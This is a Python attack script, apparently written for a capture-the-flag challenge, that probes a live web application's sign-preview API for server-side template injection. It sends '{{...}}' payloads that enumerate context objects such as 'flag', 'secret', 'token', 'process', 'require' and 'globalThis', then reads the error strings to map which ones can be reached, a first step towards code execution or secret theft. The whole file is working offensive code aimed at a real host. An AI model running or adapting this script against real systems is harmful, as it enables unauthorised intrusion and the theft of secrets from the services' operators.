#!/usr/bin/env python3
import requests

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)

def ssti(payload):
    r = s.post(BASE + '/api/sign/preview',
               json={'lines': [payload, '', '', '']},
               timeout=20)
    try:
        data = r.json()
        return data.get('lines', [None])[0]
    except:
        return r.text[:500]

# The engine evaluates math/numeric. Let's understand what variables/context exist.
# "TEMPLATE RUNE NOT FOUND" = expression error / undefined variable
# "UNKNOWN BLOCK PROPERTY"  = property access error on an object

# Try simple variable names
simple_vars = ['player', 'server', 'world', 'chunk', 'session', 'env',
               'config', 'flag', 'op', 'operator', 'debug', 'secret',
               'user', 'profile', 'data', 'db', 'permission', 'ctx',
               'context', 'game', 'dimension', 'block', 'command', 'nbt',
               'token', 'key', 'uuid', 'name', 'username',
               'process', 'require', 'module', '__dirname',
               'global', 'globalThis', 'this']

for v in simple_vars:
    r = ssti('{{' + v + '}}')
    print(f'  {v}: {r}')

print()
# Now try properties on variables that don't error with UNKNOWN BLOCK PROPERTY
# Those might be accessible objects
print('--- Testing with .toString() ---')
for v in simple_vars:
    r = ssti('{{' + v + '.toString()}}')
    if r not in ['UNKNOWN BLOCK PROPERTY', 'TEMPLATE RUNE NOT FOUND']:
        print(f'  {v}.toString(): {r}')
